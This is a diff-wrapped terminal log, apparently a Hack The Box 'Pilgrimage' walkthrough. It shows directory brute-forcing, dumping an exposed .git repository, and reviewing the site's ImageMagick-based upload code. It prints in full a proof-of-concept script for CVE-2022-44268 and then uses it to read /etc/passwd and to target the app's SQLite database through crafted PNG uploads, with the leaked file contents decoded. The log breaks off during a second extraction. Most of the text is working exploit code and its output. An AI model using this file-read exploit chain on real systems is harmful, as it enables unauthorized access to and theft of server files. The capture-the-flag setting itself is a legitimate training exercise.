@@ -1,0 +1,1588 @@
+```
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ tac /etc/hosts
+10.10.11.219  pilgrimage.htb
+
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ dirsearch -u http://pilgrimage.htb -i200,301,302,401 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 37045
+
+Output File: /home/witty/.dirsearch/reports/pilgrimage.htb/_23-07-21_16-39-44.txt
+
+Error Log: /home/witty/.dirsearch/logs/errors-23-07-21_16-39-44.log
+
+Target: http://pilgrimage.htb/
+
+[16:39:44] Starting: 
+[16:39:46] 200 -    7KB - /index.php
+[16:39:46] 200 -    6KB - /login.php
+[16:39:46] 200 -    6KB - /register.php
+[16:39:47] 302 -    0B  - /logout.php  ->  /
+[16:39:49] 200 -    7KB - /.
+[16:39:55] 302 -    0B  - /dashboard.php  ->  /login.php
+[16:39:59] 301 -  169B  - /.git  ->  http://pilgrimage.htb/.git/
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd ~/bug_hunter/GitTools/Dumper
+                                               
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper]
+└─$ ls
+git  gitdumper.sh  README.md
+
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper]
+└─$ ./gitdumper.sh http://pilgrimage.htb/.git/ git1
+###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+
+
+[*] Destination folder does not exist
+[+] Creating git1/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[-] Downloaded: /refs/wip/index/refs/heads/master
+[-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/e1/a40beebc7035212efdcb15476f9c994e3634a7
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212
+[+] Downloaded: objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d
+[+] Downloaded: objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc
+[+] Downloaded: objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d
+[+] Downloaded: objects/dc/446514835fe49994e27a1c2cf35c9e45916c71
+[+] Downloaded: objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e
+[+] Downloaded: objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548
+[+] Downloaded: objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb
+[+] Downloaded: objects/36/c734d44fe952682020fd9762ee9329af51848d
+[+] Downloaded: objects/b2/15e14bb4766deff4fb926e1aa080834935d348
+[+] Downloaded: objects/8f/155a75593279c9723a1b15e5624a304a174af2
+[+] Downloaded: objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e
+[+] Downloaded: objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e
+[+] Downloaded: objects/98/10e80fba2c826a142e241d0f65a07ee580eaad
+[+] Downloaded: objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd
+[+] Downloaded: objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc
+[+] Downloaded: objects/76/a559577d4f759fff6af1249b4a277f352822d5
+[+] Downloaded: objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c
+[+] Downloaded: objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e
+[+] Downloaded: objects/8a/62aac3b8e9105766f3873443758b7ddf18d838
+[+] Downloaded: objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783
+[+] Downloaded: objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2
+[+] Downloaded: objects/88/16d69710c5d2ee58db84afa5691495878f4ee1
+[+] Downloaded: objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a
+[+] Downloaded: objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23
+[+] Downloaded: objects/b6/c438e8ba16336198c2e62fee337e126257b909
+[+] Downloaded: objects/11/dbdd149e3a657bc59750b35e1136af861a579f
+[+] Downloaded: objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568
+[+] Downloaded: objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18
+[+] Downloaded: objects/5f/ec5e0946296a0f09badeb08571519918c3da77
+[+] Downloaded: objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987
+[+] Downloaded: objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a
+[+] Downloaded: objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322
+[+] Downloaded: objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1
+[+] Downloaded: objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34
+[+] Downloaded: objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7
+[+] Downloaded: objects/49/cd436cf92cc28645e5a8be4b1973683c95c537
+[+] Downloaded: objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3
+[+] Downloaded: objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc
+[+] Downloaded: objects/ca/d9dfca08306027b234ddc2166c838de9301487
+[+] Downloaded: objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4
+[+] Downloaded: objects/c4/3565452792f19d2cf2340266dbecb82f2a0571
+[+] Downloaded: objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59
+[+] Downloaded: objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4
+[+] Downloaded: objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14
+[+] Downloaded: objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b
+[-] Downloaded: objects/23/12310101010101010101410301010101210101
+[-] Downloaded: objects/23/03032323230123232323212123212303632303
+[-] Downloaded: objects/23/21236303230321632123036767012147470701
+[-] Downloaded: objects/47/07412547250503474341056701016565070147
+[-] Downloaded: objects/41/61416543747052570741470565674701054165
+[-] Downloaded: objects/65/43450543454147054147414565014170505650
+[-] Downloaded: objects/54/74547454747476767476767676767236323632
+[-] Downloaded: objects/36/76745054545454545456545454545454545454
+[-] Downloaded: objects/76/76701676767670105676767672167676767010
+[+] Downloaded: objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb
+[+] Downloaded: objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e
+
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper]
+└─$ cd git1 
+                                                                
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git1]
+└─$ ls
+                                                                
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git1]
+└─$ ls -lah
+total 12K
+drwxr-xr-x 3 witty witty 4.0K Jul 21 16:42 .
+drwxr-xr-x 4 witty witty 4.0K Jul 21 16:42 ..
+drwxr-xr-x 6 witty witty 4.0K Jul 21 16:43 .git
+                                                                
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git1]
+└─$ cd .git
+                                                                
+┌──(witty㉿kali)-[~/…/GitTools/Dumper/git1/.git]
+└─$ ls     
+COMMIT_EDITMSG  description  index  logs     refs
+config          HEAD         info   objects
+                                                                
+┌──(witty㉿kali)-[~/…/GitTools/Dumper/git1/.git]
+└─$ git log       
+commit e1a40beebc7035212efdcb15476f9c994e3634a7 (HEAD -> master)
+Author: emily <emily@pilgrimage.htb>
+Date:   Wed Jun 7 20:11:48 2023 +1000
+
+    Pilgrimage image shrinking service initial commit.
+┌──(witty㉿kali)-[~/…/GitTools/Dumper/git1/.git]
+└─$ cd ..  
+                                                                
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git1]
+└─$ git checkout .
+Updated 37 paths from the index
+
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git1]
+└─$ cat index.php 
+<?php
+session_start();
+require_once "assets/bulletproof.php";
+
+function isAuthenticated() {
+  return json_encode(isset($_SESSION['user']));
+}
+
+function returnUsername() {
+  return "\"" . $_SESSION['user'] . "\"";
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+  $image = new Bulletproof\Image($_FILES);
+  if($image["toConvert"]) {
+    $image->setLocation("/var/www/pilgrimage.htb/tmp");
+    $image->setSize(100, 4000000);
+    $image->setMime(array('png','jpeg'));
+    $upload = $image->upload();
+    if($upload) {
+      $mime = ".png";
+      $imagePath = $upload->getFullPath();
+      if(mime_content_type($imagePath) === "image/jpeg") {
+        $mime = ".jpeg";
+      }
+      $newname = uniqid();
+      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
+      unlink($upload->getFullPath());
+      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
+      if(isset($_SESSION['user'])) {
+        $db = new PDO('sqlite:/var/db/pilgrimage');
+        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
+        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
+      }
+      header("Location: /?message=" . $upload_path . "&status=success");
+    }
+    else {
+      header("Location: /?message=Image shrink failed&status=fail");
+    }
+  }
+  else {
+    header("Location: /?message=Image shrink failed&status=fail");
+  }
+}
+
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git1]
+└─$ ./magick -version
+Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc (7.5)
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc.git               
+Cloning into 'imagemagick-lfi-poc'...
+remote: Enumerating objects: 7, done.
+remote: Counting objects: 100% (7/7), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0
+Receiving objects: 100% (7/7), done.
+Resolving deltas: 100% (1/1), done.
+                                                                 
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd imagemagick-lfi-poc 
+                                                                 
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ ls             
+generate.py  README.md
+                                                                 
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ cat generate.py          
+import png
+import argparse
+import os
+import time
+from PIL import Image, PngImagePlugin
+
+
+#              ,----------------,              ,---------,
+#         ,-----------------------,          ,"        ,"|
+#       ,"                      ,"|        ,"        ,"  |
+#      +-----------------------+  |      ,"        ,"    |
+#      |  .-----------------.  |  |     +---------+      |
+#      |  |                 |  |  |     | -==----'|      |
+#      |  |  Sybil Scan!    |  |  |     |         |      |
+#      |  |                 |  |  |/----|`---=    |      |
+#      |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
+#      |  |                 |  |  |  // |(((( [33]|    ,"
+#      |  `-----------------'  |," .;'| |((((     |  ,"
+#      +-----------------------+  ;;  | |         |,"    
+#         /_)______________(_/  //'   | +---------+
+#    ___________________________/___  `,
+#   /  oooooooooooooooo  .o.  oooo /,   \,"-----------
+#  / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
+# /_==__==========__==_ooo__ooo=_/'   /___________,"
+# `-----------------------------'
+
+
+
+
+
+
+def main():
+    print("\n   [\u001b[32;1m>\u001b[0m] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>")
+    parser = argparse.ArgumentParser(description='imagemagick-LFI : PoC for CVE-2022-44268')
+    parser.add_argument('-f','--lfile' , help = 'Local file to read' , required=True)
+    parser.add_argument('-o', '--output', help = 'Output png file', required=True)
+    args = parser.parse_args()
+    time.sleep(0.2)
+    print("   [\u001b[32;1m>\u001b[0m] Generating Blank PNG")
+    width = 255
+    height = 255
+    img = []
+    for y in range(height):
+        row = ()
+        for x in range(width):
+            row = row + (x, max(0, 255 - x - y), y)
+        img.append(row)
+    with open('gradient.png', 'wb') as f:
+        w = png.Writer(width, height, greyscale=False)
+        w.write(f, img)
+    time.sleep(0.2)
+    print("   [\u001b[32;1m>\u001b[0m] Blank PNG generated")
+    time.sleep(0.2)
+    print(f"   [\u001b[32;1m>\u001b[0m] Placing Payload to read {args.lfile}")
+    info = PngImagePlugin.PngInfo()
+    info.add_text("profile", args.lfile)
+    im = Image.open("gradient.png")
+    im.save(args.output, "PNG", pnginfo=info)
+    time.sleep(0.2)
+    print(f"   [\u001b[32;1m>\u001b[0m] PoC PNG generated > {args.output}")
+
+    
+    gradient_file = "gradient.png"
+    if os.path.isfile(gradient_file):
+        os.remove(gradient_file)
+    else:
+        pass
+
+
+
+if __name__ == '__main__':
+    main()  
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ python3 generate.py -f "/etc/passwd" -o exploit.png
+
+   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
+   [>] Generating Blank PNG
+   [>] Blank PNG generated
+   [>] Placing Payload to read /etc/passwd
+   [>] PoC PNG generated > exploit.png
+                                                                 
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ ls
+exploit.png  generate.py  README.md
+
+upload img
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ wget http://pilgrimage.htb/shrunk/64baf096475a4.png   
+--2023-07-21 16:54:56--  http://pilgrimage.htb/shrunk/64baf096475a4.png
+Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
+Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1688 (1.6K) [image/png]
+Saving to: ‘64baf096475a4.png’
+
+64baf096475a4.pn 100%[=======>]   1.65K  --.-KB/s    in 0s      
+
+2023-07-21 16:54:56 (51.5 MB/s) - ‘64baf096475a4.png’ saved [1688/1688]
+
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ identify -verbose 64baf096475a4.png 
+Image:
+  Filename: 64baf096475a4.png
+  Format: PNG (Portable Network Graphics)
+  Mime type: image/png
+  Class: DirectClass
+  Geometry: 128x128+0+0
+  Units: Undefined
+  Colorspace: sRGB
+  Type: TrueColor
+  Base type: Undefined
+  Endianness: Undefined
+  Depth: 8-bit
+  Channel depth:
+    red: 8-bit
+    green: 8-bit
+    blue: 8-bit
+  Channel statistics:
+    Pixels: 16384
+    Red:
+      min: 1  (0.00392157)
+      max: 253 (0.992157)
+      mean: 127 (0.498039)
+      standard deviation: 73.8482 (0.289601)
+      kurtosis: -1.20334
+      skewness: 4.86834e-13
+      entropy: 1
+    Green:
+      min: 0  (0)
+      max: 254 (0.996078)
+      mean: 43.0449 (0.168804)
+      standard deviation: 60.431 (0.236984)
+      kurtosis: 0.701623
+      skewness: 1.3265
+      entropy: 0.620203
+    Blue:
+      min: 1  (0.00392157)
+      max: 253 (0.992157)
+      mean: 127 (0.498039)
+      standard deviation: 73.8482 (0.289601)
+      kurtosis: -1.20334
+      skewness: 2.05705e-14
+      entropy: 1
+  Image statistics:
+    Overall:
+      min: 0  (0)
+      max: 254 (0.996078)
+      mean: 99.015 (0.388294)
+      standard deviation: 69.3758 (0.272062)
+      kurtosis: -1.20718
+      skewness: 0.300562
+      entropy: 0.873401
+  Rendering intent: Perceptual
+  Gamma: 0.45455
+  Chromaticity:
+    red primary: (0.64,0.33)
+    green primary: (0.3,0.6)
+    blue primary: (0.15,0.06)
+    white point: (0.3127,0.329)
+  Background color: white
+  Border color: srgb(223,223,223)
+  Matte color: grey74
+  Transparent color: black
+  Interlace: None
+  Intensity: Undefined
+  Compose: Over
+  Page geometry: 128x128+0+0
+  Dispose: Undefined
+  Iterations: 0
+  Compression: Zip
+  Orientation: Undefined
+  Properties:
+    date:create: 2023-07-21T20:54:56+00:00
+    date:modify: 2023-07-21T20:54:46+00:00
+    date:timestamp: 2023-07-21T20:54:46+00:00
+    png:bKGD: chunk was found (see Background color, above)
+    png:cHRM: chunk was found (see Chromaticity, above)
+    png:gAMA: gamma=0.45455 (See Gamma, above)
+    png:IHDR.bit-depth-orig: 8
+    png:IHDR.bit_depth: 8
+    png:IHDR.color-type-orig: 2
+    png:IHDR.color_type: 2 (Truecolor)
+    png:IHDR.interlace_method: 0 (Not interlaced)
+    png:IHDR.width,height: 128, 128
+    png:sRGB: intent=0 (Perceptual Intent)
+    png:text: 4 tEXt/zTXt/iTXt chunks were found
+    png:tIME: 2023-07-21T20:54:46Z
+    Raw profile type: 
+
+    1437
+726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
+6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
+6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
+2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
+6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
+62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
+65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
+2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
+783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
+6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
+2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
+706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
+303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
+6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
+722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
+646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
+75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
+7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
+7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
+696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
+62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
+5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
+6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
+3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
+2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
+656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
+6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
+6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
+0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
+65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
+6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
+74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
+796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
+7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
+6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
+652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
+3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
+7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
+737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
+3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
+
+    signature: 78b9dfbaedd0d5cd7cb91c9ff9c2c2c925fd67a642483e6cd977973230841b28
+  Artifacts:
+    filename: 64baf096475a4.png
+    verbose: true
+  Tainted: False
+  Filesize: 1688B
+  Number pixels: 16384
+  Pixels per second: 7.67586MB
+  User time: 0.000u
+  Elapsed time: 0:01.002
+  Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
+
+or 
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ exiftool 64baf096475a4.png 
+ExifTool Version Number         : 12.57
+File Name                       : 64baf096475a4.png
+Directory                       : .
+File Size                       : 1688 bytes
+File Modification Date/Time     : 2023:07:21 16:54:46-04:00
+File Access Date/Time           : 2023:07:21 16:55:52-04:00
+File Inode Change Date/Time     : 2023:07:21 16:54:56-04:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 128
+Image Height                    : 128
+Bit Depth                       : 8
+Color Type                      : RGB
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Gamma                           : 2.2
+White Point X                   : 0.3127
+White Point Y                   : 0.329
+Red X                           : 0.64
+Red Y                           : 0.33
+Green X                         : 0.3
+Green Y                         : 0.6
+Blue X                          : 0.15
+Blue Y                          : 0.06
+Background Color                : 255 255 255
+Modify Date                     : 2023:07:21 20:54:46
+Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d.65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a.2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a.783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372.2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73.706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31.303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f.6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573.722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d.646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b.75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f.7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69.7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67.696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73.62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d.5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e.6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334.3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e.2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374.656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72.6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65.6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e.0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052.65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973.74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573.796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69.7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c.6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d.652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78.3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f.7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f.737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938.3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a.
+Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
+Datecreate                      : 2023-07-21T20:54:46+00:00
+Datemodify                      : 2023-07-21T20:54:46+00:00
+Datetimestamp                   : 2023-07-21T20:54:46+00:00
+Image Size                      : 128x128
+Megapixels                      : 0.016
+
+from hex
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ python3 generate.py -f "/var/db/pilgrimage" -o exploit2.png
+
+   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
+   [>] Generating Blank PNG
+   [>] Blank PNG generated
+   [>] Placing Payload to read /var/db/pilgrimage
+   [>] PoC PNG generated > exploit2.png
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ wget http://pilgrimage.htb/shrunk/64baf193755c2.png
+--2023-07-21 16:59:08--  http://pilgrimage.htb/shrunk/64baf193755c2.png
+Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
+Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1903 (1.9K) [image/png]
+Saving to: ‘64baf193755c2.png’
+
+64baf193755c2.png     100%[======================>]   1.86K  --.-KB/s    in 0s      
+
+2023-07-21 16:59:08 (197 MB/s) - ‘64baf193755c2.png’ saved [1903/1903]
+
+┌──(witty㉿kali)-[~/Downloads/imagemagick-lfi-poc]
+└─$ identify -verbose 64baf193755c2.png 
+Image:
+  Filename: 64baf193755c2.png
+  Format: PNG (Portable Network Graphics)
+  Mime type: image/png
+  Class: DirectClass
+  Geometry: 128x128+0+0
+  Units: Undefined
+  Colorspace: sRGB
+  Type: TrueColor
+  Base type: Undefined
+  Endianness: Undefined
+  Depth: 8-bit
+  Channel depth:
+    red: 8-bit
+    green: 8-bit
+    blue: 8-bit
+  Channel statistics:
+    Pixels: 16384
+    Red:
+      min: 1  (0.00392157)
+      max: 253 (0.992157)
+      mean: 127 (0.498039)
